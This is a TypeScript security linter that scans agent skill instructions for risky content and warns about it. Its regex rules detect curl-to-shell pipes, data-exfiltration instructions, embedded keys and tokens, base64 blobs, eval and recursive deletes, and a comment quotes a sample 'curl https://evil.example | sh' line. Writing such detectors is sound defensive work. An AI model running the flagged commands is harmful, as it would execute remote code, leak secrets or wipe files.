/**
 * Basic security lint for skill instructions.
 *
 * Agent skills are executable instructions: a skill that tells the agent to
 * run `curl … | sh` or embeds an API key is a real attack vector. These
 * checks are heuristic — they produce warnings, never errors — but they
 * make dangerous patterns visible before a skill is saved or exported.
 */

export interface SecurityWarning {
  message: string;
}

interface Check {
  test: (text: string) => RegExpMatchArray | null;
  message: (match: RegExpMatchArray, text: string) => string;
}

const CHECKS: Check[] = [
  {
    // curl https://evil.example | sh — classic remote-code-execution pattern
    test: (t) => t.match(/\b(?:curl|wget)[^\n]*\|\s*(?:sh|bash|zsh|dash|fish)\b/i),
    message: () =>
      "Security: pipes a downloaded script directly into a shell (e.g. `curl … | sh`). The agent would execute remote code sight unseen — prefer downloading, inspecting, then running.",
  },
  {
    test: (t) => {
      // ignore documentation/example hosts — those aren't exfiltration targets
      const stripped = t.replace(/https?:\/\/(?:[a-z0-9-]+\.)*example\.com[^\s)"'`>]*/gi, "");
      return stripped.match(
        /(?:send|upload|post|transmit|exfiltrat|forward)[^\n]{0,80}https?:\/\/[^\s)"'`>]+/i,
      );
    },
    message: (m) =>
      `Security: instructs the agent to send data to an external URL (${truncateUrl(m[0])}). Make sure that destination is intended and trusted.`,
  },
  {
    test: (t) =>
      t.match(/-----BEGIN (?:RSA |DSA |EC |OPENSSH )?PRIVATE KEY-----/),
    message: () =>
      "Security: contains a private key block. Never ship real credentials inside a skill — use environment variables or a secrets manager instead.",
  },
  {
    test: (t) => t.match(/\bsk-[A-Za-z0-9]{20,}\b/),
    message: () =>
      "Security: contains a string that looks like an API key (`sk-…`). Rotate it if it is real, and remove it from the skill.",
  },
  {
    test: (t) => t.match(/\b(?:ghp_[A-Za-z0-9]{20,}|github_pat_[A-Za-z0-9_]{20,})\b/),
    message: () =>
      "Security: contains a string that looks like a GitHub token. Revoke it if it is real, and remove it from the skill.",
  },
  {
    test: (t) => t.match(/\bAKIA[0-9A-Z]{16}\b/),
    message: () =>
      "Security: contains a string that looks like an AWS access key ID. Rotate it if it is real, and remove it from the skill.",
  },
  {
    test: (t) =>
      t.match(
        /\b(?:api[_-]?key|apikey|client[_-]?secret|auth[_-]?token|access[_-]?token|password|passwd)\b\s*[:=]\s*['"]?([^\s'";]{8,})/i,
      ),
    message: (m) =>
      `Security: looks like an embedded credential (\`${truncateSecret(m[1])}\`). Never ship real secrets in a skill.`,
  },
  {
    // long base64-ish blob: possible obfuscated payload or embedded secret
    test: (t) => t.match(/\b[A-Za-z0-9+/]{120,}={0,2}\b/),
    message: () =>
      "Security: contains a long base64-like blob. If it hides a payload or a secret, decode and review it before sharing this skill.",
  },
  {
    test: (t) => t.match(/\beval\s*\(/),
    message: () =>
      "Security: uses `eval(...)` — executing dynamically built code is a common injection vector. Prefer a safer alternative.",
  },
  {
    test: (t) => {
      for (const line of t.split(/\r?\n/)) {
        const m = line.match(/\brm\s+(-[a-zA-Z]*)\s+(\S+)/);
        if (m && /r/i.test(m[1]) && /f/i.test(m[1]) && /^[~/]/.test(m[2])) {
          return m as unknown as RegExpMatchArray;
        }
      }
      return null;
    },
    message: (m) =>
      `Security: contains a destructive recursive delete (\`rm ${m[1]} ${m[2]}\`). Double-check the target path — a wrong variable could wipe a filesystem.`,
  },
];

function truncateUrl(text: string): string {
  const m = text.match(/https?:\/\/[^\s)"'`>]+/);
  const url = m ? m[0] : text;
  return url.length > 60 ? url.slice(0, 57) + "…" : url;
}

function truncateSecret(value: string): string {
  const v = value.replace(/['"]+$/, "");
  return v.length > 12 ? v.slice(0, 4) + "…" + v.slice(-2) : v.slice(0, 4) + "…";
}

/**
 * Scan free text (usually the skill body) for suspicious patterns.
 * Returns human-readable warning messages, deduplicated.
 */
export function lintSecurity(text: string): string[] {
  const found: string[] = [];
  const push = (message: string) => {
    if (found.indexOf(message) === -1) found.push(message);
  };
  for (const check of CHECKS) {
    const m = check.test(text);
    if (m) push(check.message(m, text));
  }

  // Flag external URLs, but collapse them into a single warning.
  const urls: string[] = [];
  const urlMatches = text.match(/https?:\/\/[^\s)"'`>]+/gi) || [];
  for (let i = 0; i < urlMatches.length; i++) {
    const host = (urlMatches[i].split("/")[2] || "").toLowerCase();
    if (
      host &&
      !/^([a-z0-9-]+\.)*example\.com(:\d+)?$/.test(host) &&
      !/^localhost(:\d+)?$/.test(host)
    ) {
      const clean = urlMatches[i].replace(/[.,;:!?]+$/, "");
      if (urls.indexOf(clean) === -1) urls.push(clean);
    }
  }
  if (urls.length > 0) {
    const shown = urls.slice(0, 3).map(truncateUrl).join(", ");
    const extra = urls.length > 3 ? ` (+${urls.length - 3} more)` : "";
    push(
      `Security: references external URL(s): ${shown}${extra} — verify each destination is intended and trustworthy before sharing this skill.`,
    );
  }

  return found;
}
